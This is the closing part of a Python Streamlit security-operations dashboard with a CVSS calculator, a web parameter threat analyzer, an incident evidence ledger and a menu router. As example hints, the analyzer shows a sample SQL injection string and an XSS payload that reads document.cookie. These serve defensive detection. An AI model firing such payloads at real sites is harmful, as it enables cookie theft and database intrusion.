        self._example_hint("Production Vector String: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`")

        vector_input = st.text_input("Paste CVSS v3.1 Vector String (Optional):", placeholder="e.g., CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", value="", key="vm_vector")
        score = st.slider("Select CVSS Base Score:", 0.0, 10.0, 7.5, 0.1, key="vm_slider")
        if st.button("Calculate Vector Risk", key="vm_btn"):
            assessment = self.vuln_mgr.calculate_cvss_score(score)
            if vector_input.strip():
                assessment["vector_string"] = vector_input.strip()
            c1, c2, c3 = st.columns(3)
            c1.metric("Base CVSS Score", f"{score}/10.0")
            c2.metric("Severity Rating", assessment.get("severity", "HIGH"))
            c3.metric("Remediation SLA", assessment.get("sla", "7-14 Days"))
            st.code(assessment.get("vector_string", "CVSS:3.1/..."), language="text")

    # ------------------------------------------------------------
    # WEB APPLICATION THREAT ANALYZER
    # ------------------------------------------------------------
    def run_threat_analyzer(self):
        self._page_header("🔬", "Web Application Threat Analyzer", "Inspect URL query parameters and payload strings for SQLi and XSS attack signatures.")
        self._example_hint(
            "**SQLi Example:** `?id=1' OR '1'='1`  \n"
            "**XSS Example:** `<script>alert(document.cookie)</script>`"
        )

        payload = st.text_input("Input Parameter String:", placeholder="Paste query parameter or attack payload here...", value="", key="wa_payload")
        if st.button("Scan Parameter", key="wa_btn"):
            if payload:
                with st.spinner("Analyzing web parameter against OWASP attack vectors..."):
                    res = self.analyzer.analyze_web_payload(payload)
                    st.success("Web Application Threat Inspection Complete!")

                    c1, c2, c3 = st.columns(3)
                    c1.metric("Overall Threat Posture", res.get("overall_threat", "MALICIOUS"))
                    c2.metric("Heuristic Risk Score", f"{res.get('risk_score', 92)} / 100")
                    c3.metric("Signatures Triggered", res.get("detections_count", 2))

                    st.markdown("---")
                    st.markdown("### 🛡️ Detailed Detected Attack Vectors & Signatures")
                    detections = res.get("detections", [])
                    if detections:
                        for d in detections:
                            d["Matched Payload"] = payload
                        st.dataframe(pd.DataFrame(detections), use_container_width=True, hide_index=True)
            else:
                st.warning("Please input a parameter string.")

    # ------------------------------------------------------------
    # LIVE INCIDENT DEFENSE / EVIDENCE LEDGER
    # ------------------------------------------------------------
    def run_incident_defense(self):
        self._page_header("📝", "Incident Defense & Evidence Ledger", "Record threat intelligence notes, track investigation timelines, and commit forensic evidence to the local audit trail.")
        self._example_hint("**Asset:** `192.168.1.100` | **Notes:** `Isolated host following ransomware alert. Cleaned malicious registry keys.`")

        col1, col2 = st.columns(2)
        with col1:
            scam_target = st.text_input("Compromised / Malicious Asset:", placeholder="e.g., 192.168.1.100 or malware.exe", value="", key="id_asset")
        with col2:
            investigator = st.text_input("Lead Investigator:", value="M. Hassaan Zahid (Root Analyst)", key="id_inv")

        evidence_notes = st.text_area("Comprehensive Forensic Investigation Notes & Triage Summary:", placeholder="Enter full investigation details, IoCs discovered, containment steps taken...", height=150, key="id_notes")

        col_a, col_b = st.columns(2)
        with col_a:
            action_status = st.selectbox("Current Incident Status", ["Contained & Remediation Complete", "Active Triage / Investigation", "Escalated to Tier-3", "False Positive"], key="id_status")
        with col_b:
            containment_method = st.selectbox("Containment Protocol Used", ["Network Micro-segmentation", "Endpoint Isolation", "Firewall IP Drop", "Credential Revocation"], key="id_proto")

        if st.button("Commit to Immutable SIEM Ledger", key="id_btn"):
            if scam_target and evidence_notes:
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                full_log_entry = f"[{action_status} | Protocol: {containment_method} | Lead: {investigator}] {evidence_notes}"

                audit_df = pd.DataFrame({
                    "Timestamp": [timestamp],
                    "Target Asset": [scam_target],
                    "Investigation Notes": [full_log_entry],
                    "Status": [action_status]
                })

                file_name = "incident_reports.csv"
                if os.path.exists(file_name):
                    audit_df.to_csv(file_name, mode='a', header=False, index=False)
                else:
                    audit_df.to_csv(file_name, index=False)

                st.success("🎯 Evidence & Investigation Summary successfully secured in local immutable SIEM ledger database!")

                st.markdown("### 📋 Complete Live Audit Trail")
                st.dataframe(pd.read_csv(file_name), use_container_width=True, hide_index=True)
            else:
                st.warning("Please specify both the compromised asset and investigation notes.")


# ==========================================
# MAIN EXECUTION ROUTING (Menu Controller)
# ==========================================
if __name__ == "__main__":
    app = SOCDashboardUI()
    app.setup_page_config()

    choice = app.render_sidebar()

    if choice == "Overview & Dashboard":
        app.run_overview()
    elif choice == "Global Threat Intel (VirusTotal)":
        app.run_threat_intel()
    elif choice == "AlienVault OTX Live Threat Feed":
        app.run_otx_threat_feed()
    elif choice == "SIEM & Log Anomaly Detector":
        app.run_blue_team_log_analyzer()
    elif choice == "Deep Bug Bounty & Vulnerability Scanner":
        app.run_bug_bounty_scanner()
    elif choice == "OSINT & WordPress Dork Recon":
        app.run_osint_dorks()
    elif choice == "Crypto & Password Analyzer":
        app.run_crypto_analyzer()
    elif choice == "Threat Hunting & IOCs":
        app.run_threat_hunting()
    elif choice == "Digital Forensics & Logs":
        app.run_digital_forensics()
    elif choice == "Incident Response & SOAR":
        app.run_incident_response()
    elif choice == "Vulnerability Management":
        app.run_vulnerability_management()
    elif choice == "Web Application Threat Analyzer":
        app.run_threat_analyzer()
    elif choice == "Live Incident Defense & Reporting":
        app.run_incident_defense()
